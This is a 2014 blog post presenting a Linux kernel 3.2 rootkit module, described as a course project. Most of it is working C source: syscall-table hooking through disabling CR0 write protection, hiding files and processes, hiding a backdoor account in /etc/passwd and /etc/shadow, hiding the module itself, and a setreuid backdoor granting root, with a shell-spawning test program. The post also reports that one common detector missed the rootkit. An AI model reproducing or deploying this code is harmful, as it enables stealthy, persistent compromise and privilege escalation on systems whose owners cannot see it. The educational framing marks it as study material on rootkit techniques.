---
author: kevinkoo001@gmail.com
comments: false
date: 2014-12-23 04:20:24+00:00
layout: post
link: http://dandylife.net/blog/archives/304
slug: rootkit-module-in-linux-kernel-3-2
title: Rootkit module in Linux Kernel 3.2
wordpress_id: 304
categories:
- Attack &amp; Defense, Cyber Warfare
---

[![matrix-rootkit](http://newt.arvixe.com/~mrkoo001/blog/wp-content/uploads/2014/12/matrix-rootkit.jpg)](http://newt.arvixe.com/~mrkoo001/blog/wp-content/uploads/2014/12/matrix-rootkit.jpg)

This _rootkit _has been created for educational purpose with Chen as part of course project. _Rootkit_ itself is not one of malicious-oriented concepts, but it is often classified as malware kinds because of its powerful manipulation techniques in system. Here is brief introduction about both principle and implementation.

**1. System call table Hooking**

As you might imagine, one of common techniques - system call table hooking - has been employed. The processes in user space in Linux call a variety of interrupts to kernel space. Those interrupts are stored in predefined table, IDT or interrupt descriptor table while initialization process in Linux. It stores the registered function pointers to handle diverse interrupts. The "system call table" contains the data structure to process system calls when calling interrupt 0x80 in Linux. The idea is to manipulate the function pointers in system call table with hijacking in order to insert desired actions. The original system call has been stored somewhere to avoid unwanted system crash.

**2. Target Platform**

ubuntu-12.04.1 64 bits, LTS kernel 3.2.0-29-generic

**3. Features**



	
  * Adopt extendable structure design and the initial framework

	
  * Hide specific files and directories with defined prefixes (i.e _hide_, bad_,_ ) from showing up when a user does "_ls_" and similar commands

	
  * Hide a backdoor account with defined account (i.e_ daemon_) by modifying the /_etc/passwd_ and _/etc/shadow_

	
  * Hide processes from the process table

	
  * Hide the _rootkit_ module itself

	
  * Privilege escalation to gain root through running a specially crafted executable


**4. Implementations**

This part illustrates main parts of code snippets and descriptions. Overall, the design of the _rookit_ has considered an extendable structure. It is simple to add new features as well as debugging and cooperative tasks on top of current architecture. You may want to check out full codes in my _github_ here: [https://github.com/kevinkoo001/rootkit](https://github.com/kevinkoo001/rootkit)

(1) Main headers

    
    #include <linux/init.h>
    #include <linux/kernel.h>
    #include <linux/errno.h>	// error numbers
    #include <linux/types.h>
    
    #include <linux/module.h>	// struct module
    #include <linux/unistd.h>	// all system call numbers
    #include <linux/cred.h>		// struct cred
    #include <linux/sched.h>	// struct task_struct
    #include <linux/syscalls.h>	// all system calls
    #include <linux/slab.h>
    #include <linux/fs.h>		// virtual file system 
    #include <linux/uaccess.h>
    #include <linux/ioctl.h>
    #include <linux/miscdevice.h>
    #include <linux/string.h>	// String manipulation
    #include <linux/kobject.h>	// Define kobjects, stuructures, and functions
    #include <linux/namei.h>	// file lookup
    #include <linux/path.h>		// struct path, path_equal()
    #include <linux/file.h>		// struct file *fget(unsigned int fd);
    #include <linux/proc_fs.h>      // struct proc_dir_entry;
    
    #include <asm/system.h>
    #include <asm/current.h>
    #include "config.h"


(2) Main part of the _rootkit_

The system call table address can be obtained from _System.map_ as following:

    
    $ sudo cat /boot/System.map-`uname -r` | grep sys_call_table
    ffffffff81801300 R sys_call_table


The following command will not work in kernel 3.x because it does not allow export to _/proc/kallsyms_

    
    $ sudo cat /proc/kallsyms | grep sys_call_table
    0000000000000000 R sys_call_table


Hence we used PROT_DISABLE and PROT_ENABLE which are the scripts to set system call table to be writable directly by enabling and disabling **cr0** register protection respectively, pre-defined in _config.h. _There are many other (old) techniques to manipulate system call table. (One of well written articles is here by chanam.park: [http://hkpco.kr/paper/crtlk.txt](http://hkpco.kr/paper/crtlk.txt))

    
    #define PROT_ENABLE write_cr0(read_cr0() | 0x10000)      // CR0 protection Enabled
    #define PROT_DISABLE write_cr0(read_cr0() & (~ 0x10000)) // CR0 protection Disabled


Here are several snippets of main flow.

S1 gets the fixed system call table address and the addresses of the original system calls.
S2 initializes the module with overwriting original system calls
S3 demonstrates hiding/revealing this module itself
S4 restores manipulated system calls to the original ones

For S3, we have tested to find the root module in kernel with various attempts.

    
    # lsmod | grep kcr
    # modprobe
    # cat /proc/modules | grep kcr
    # cat /proc/kallsyms | grep "\[kcr\]"
    # ls -la /sys/module | grep kcr


a. [S1] Getting system call table address

    
    // System call table adddress
    static unsigned long *sys_call_table = (unsigned long *) 0xffffffff81801300;
    
    // Get the addresses of the original system calls
    asmlinkage long (*original_write)(unsigned int, const char*, size_t);
    asmlinkage long (*original_getdents)(unsigned int, struct linux_dirent64*, unsigned int);
    asmlinkage long (*original_setreuid)(uid_t, uid_t);
    asmlinkage long (*original_open)(const char*, int, int);
    asmlinkage long (*original_read)(unsigned int, char*, size_t);


b. [S2] Overwriting original system calls

    
    static int 
    __init init_mod(void){
    	
    	misc_register(&kcr);
    	
    	// Set system call table to be writable by changing cr0 register
    	PROT_DISABLE;
    	
    	// Get original system call addr in asm/unistd.h
    	original_write = (void *)sys_call_table[__NR_write];		// __NR_write 64
    	original_getdents = (void *)sys_call_table[__NR_getdents];	// __NR_getdents64 61
    	original_setreuid = (void *)sys_call_table[__NR_setreuid];	// __NR_setreuid 145
    	original_read = (void *)sys_call_table[__NR_read];		// __NR_open 63
    	
    	// Overwrite manipulated system calls
    	sys_call_table[__NR_write] = (unsigned long) my_write;
    	sys_call_table[__NR_getdents] = (unsigned long) my_getdents;
    	sys_call_table[__NR_setreuid] = (unsigned long) my_setreuid;
    	sys_call_table[__NR_read] = (unsigned long) my_read;
    	
    	if(init_HJ_proc() == false)
    		rm_HJ_proc();
    
    	//Changing the control bit back
    	PROT_ENABLE;
    	
    	/*
    	// This feature seems unstable now!
    	// The first insmod is fine, but when rmmod and insmod again.. :(
    	hiding_module();
    	unhiding_module();
    	*/
    
    	return 0;
    }


c. [S3] Hiding/Unhiding the module

    
    void
    hiding_module(void) {
    	// Save the addr of this module to restore if necessary
    	saved_mod_list_head = THIS_MODULE->list.prev;
    	saved_kobj_parent = THIS_MODULE->mkobj.kobj.parent;
    	
    	// Remove this module from the module list and kobject list
    	list_del(&THIS_MODULE->list);
    	kobject_del(&THIS_MODULE->mkobj.kobj);
    	
    	// Remove the symbol and string tables for kallsyms
    	// IF NOT SET TO NULL, IT WILL GET THE FOLLOWING ERROR MSG:
    	// "sysfs group ffff8800260e4000 not found for kobject 'rt'"
    	THIS_MODULE->sect_attrs = NULL;
    	THIS_MODULE->notes_attrs = NULL;
    }
    
    void
    unhiding_module(void) {
    	int r;
    	
    	// Restore this module to the module list and kobject list
    	list_add(&THIS_MODULE->list, saved_mod_list_head);
    	if ((r = kobject_add(&THIS_MODULE->mkobj.kobj, saved_kobj_parent, "rt")) < 0)
    		printk(KERN_ALERT "Error to restore kobject to the list back!!\n");
    }


d. [S4] Restoring to original system calls

    
    static void 
    __exit exit_mod(void){
    
    	 misc_deregister(&kcr);
    	 
    	// Restore all system calls to the original ones
    	PROT_DISABLE;
    	sys_call_table[__NR_write] = (unsigned long) original_write;
    	sys_call_table[__NR_getdents] = (unsigned long) original_getdents;
    	sys_call_table[__NR_setreuid] = (unsigned long) original_setreuid;
    	sys_call_table[__NR_read] = (unsigned long) original_read;
    
    	if(rm_HJ_proc() == false)
    		panic("oops HJ_proc\n");
    
    	PROT_ENABLE;
    }


(3) Hiding files and directories by hijacking _getdents _system call

By hooking the “_getdents_” system call - getting directory entries in a directory and return them to a passed in a buffer - the “_my_getdents_” function filters out whether or not there are predefined prefixes. If so, overwrite the entry with its successor in an iterative way until reaching the end. The corresponding code is in _src/HJ_ls.c_

    
    if(ret){
    		buf = kmalloc(ret, GFP_KERNEL);
    		copy_from_user(buf, dirp,ret);
    		ptr = (char *)buf;
    flag1:		while(ptr < (char *)buf + ret) {
    			curr = (struct dirent *)ptr;
    			str_idx = 0; 
    			tmp = hide_prefix[str_idx];
    			while(tmp){
    				if(strstr(curr->d_name, tmp)){
    					if(curr != buf)	{
    						prev->d_reclen += curr->d_reclen;
    						goto find;
    					}
    					else{
    						ret -= curr->d_reclen;
    						memcpy(curr, curr + curr->d_reclen, ret);
    						goto flag1;
    					}
    				}else{
    					tmp  = hide_prefix[++str_idx];
    					continue; 
    				}
    			}
    			goto notfound;
    find:			ptr += curr->d_reclen;
    			goto flag1;
    notfound:		prev = curr;                  
    			ptr += curr->d_reclen;
    		}	
    		copy_to_user(dirp, buf, ret);
    		kfree(buf);
    }


(4) Hiding a credential by hijacking _read_ system call

Once the _file_ turns out to be a normal file from file descriptor, _fd_, then the idea is to assign three pointers pointing to the specific position. Then leave out specific strings and copy the remainder.The corresponding code is in _src/HJ_read.c_

    
    if(file) {
    	// Get the absolute path of current file
    	file_path = file->f_path;
    	path_get(&file->f_path);
    	tmp = (char *)__get_free_page(GFP_TEMPORARY);
    	abs_path = d_path(&file_path, tmp, PAGE_SIZE);
    	path_put(&file_path);
    	free_page(tmp);
    
    	ret = original_read(fd, buf, count);
    
    	// If the targeted file and some sanity checks
    	if(ret && (strcmp(abs_path, passwd) == 0 || strcmp(abs_path, shadow) == 0)) {
    		
    		// Allocate new buffer and copy string from user space
    		buf2 = kmalloc(ret, GFP_KERNEL);
    		copy_from_user(buf2, buf, ret);
    		/* 
    			Do string manipulation to hide an attacker's account
    			Set the three pointers, and leave out the target 
    		*/
    		ptr1 = buf2;
    		ptr2 = strstr(buf2, hide_str);
    		ptr3 = ptr2;
    		
    		while (*ptr3 != *delimiter)
    			ptr3++;
    			
    		ret -= (unsigned long)(ptr3 - ptr2);
    		buf_len_to_copy = ptr1 + strlen(buf2) - ptr3;
    		
    		ptr3++;
    		for (i = 0; i < buf_len_to_copy; i++)
    			*ptr2++ = *ptr3++;
    		buf2[(void*)ptr2 - (void*)ptr1] = NULL;
    		
    		// Copy the altered string to user space
    		copy_to_user(buf, buf2, ret);
    		kfree(buf2);
    	}
    }


(5) Hiding a process by hijacking _filldir_ system call

Since /_proc_ is a mounted file system in Linux, it should be able to provide a VFS interface to the user programs and library code to use. By hooking one of the interfaces, and replacing it with another, _my_filldir_, it allows to intercept its system call when user program tries to register the call back function instead. It will return 0 when having specified process to hide. The corresponding code is in _src/HJ_proc.c_.

    
    static int 
    my_filldir(void *buf, char *proc_name, int len, loff_t off, u64 ino, unsigned int d_type){
    	// hide the processes
    	unsigned int i = 0;
    	char *str = hide_proc[i++];
    	while(str){
    		if(!strcmp(proc_name, str)){
    			printk("haha\n");
    			return 0;
    		}
    		str = hide_proc[i++];
    	}
    	return original_filldir(buf, proc_name, len, off, ino, d_type);	
    }
    
    static int 
    my_proc_readdir(struct file* filep, void *dirent, filldir_t filldir){
    	original_filldir = filldir;
    	return original_proc_readdir(filep, dirent, my_filldir);
    }
    
    bool 
    init_HJ_proc(){
    	//name the dummy proc with hide_ prefix so that it won't show when user try to check /proc with ls
    	hide_HJ_dummy = create_proc_entry("hide_dummy", 0777, NULL);
    	HJ_target = hide_HJ_dummy->parent;
    	fops_ptr = ((struct file_operations *)HJ_target->proc_fops);
    	original_proc_readdir = fops_ptr->readdir;
    	fops_ptr->readdir = my_proc_readdir;
    	return true;
    }
    
    bool 
    rm_HJ_proc(){
    	remove_proc_entry("dummy", NULL);
    	fops_ptr->readdir = original_proc_readdir;
    	return true;
    }


(6) Privilege Escalation

    
    asmlinkage long
    my_setreuid(uid_t ruid, uid_t euid) {
    
    	// Hooking a certain condition below
    	if( (ruid == BACKDOOR_RUID) && (euid == BACKDOOR_EUID) ) {
    		struct cred *credential = prepare_creds();
    
    		// Set the permission of the current process to root
    		credential -> uid = 0;
    		credential -> gid = 0;
    		credential -> euid = 0;
    		credential -> egid = 0;
    		credential -> suid = 0;
    		credential -> sgid = 0;
    		credential -> fsuid = 0;
    		credential -> fsgid = 0;
    		
    		return commit_creds(credential);
    	}
    	
    	// Otherwise just call original function
    	return original_setreuid(ruid, euid);
    }


If a certain set of (_ruid_/_euid_) is configured to a normal program with a user privilege (i.e _ruid_ = 1234, _euid =_ 5678), it will obtain a root privilege with this backdoor at once. The “_cred_” structure has been used in _linux/cred.h. _The following is a simple test code to test backdoor feature.

    
    #include <stdio.h>
    
    int main(void)
    {
    	int ruid = 1234;
    	int euid = 5678;
    	
    	setreuid(ruid, euid);
    	system("/bin/sh");
    }


Lastly, I have made an attempt to detect the _rootkit_ with existing tools - _chkrookit_ and _rkhunter_ - to see if they can detect it.  Interesting enough, _rkhunter_ does not detect anything, meaning that the following results are exactly the same with the one before infection whereas _chkrootkit_ discovered 2 hidden processes.

Note that any misuse of this article would be beyond my scope of responsibility. 

**5. References**



	
  * Linux Kernel Programming Guide, [http://www.tldp.org/LDP/lkmpg/2.6/html/index.html](http://www.tldp.org/LDP/lkmpg/2.6/html/index.html)

	
  * Linux Device Drivers, Third Edition, [http://lwn.net/Kernel/LDD3/](http://lwn.net/Kernel/LDD3/)

	
  * Linux man – _strace_, [http://linux.die.net/man/1/strace](http://linux.die.net/man/1/strace)

	
  * Linux Cross Reference, [http://lxr.linux.no/](http://lxr.linux.no/)

	
  * Linux Cross Reference, [http://lxr.free-electrons.com/search](http://lxr.free-electrons.com/search)

	
  * Jamie Butler and Greg Hoglund, VICE – Catch the hookers! In blackhat US 2004, [http://www.blackhat.com/presentations/bh-usa-04/bh-us-04-butler/bh-us-04-butler.pdf](http://www.blackhat.com/presentations/bh-usa-04/bh-us-04-butler/bh-us-04-butler.pdf)

	
  * Andreas Bunten, UNIX and Linux based Kernel Rooktkits, DIMVA 2004, [http://www.kernelhacking.com/rodrigo/docs/StMichael/BuntenSlides.pdf](http://www.kernelhacking.com/rodrigo/docs/StMichael/BuntenSlides.pdf)

	
  * Complete Linux Loadable Kernel Modules, [https://www.thc.org/papers/LKM_HACKING.html](https://www.thc.org/papers/LKM_HACKING.html)

	
  * _Syscall_ Hijacking Kernel 2.6.* systems in memset’s Blog,
[http://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/](http://memset.wordpress.com/2010/12/03/syscall-hijacking-kernel-2-6-systems/)

	
  * _chrootkit_, [http://www.chkrootkit.org/](http://www.chkrootkit.org/)

	
  * _rkhunter_, [http://rkhunter.sourceforge.net/](http://rkhunter.sourceforge.net/)


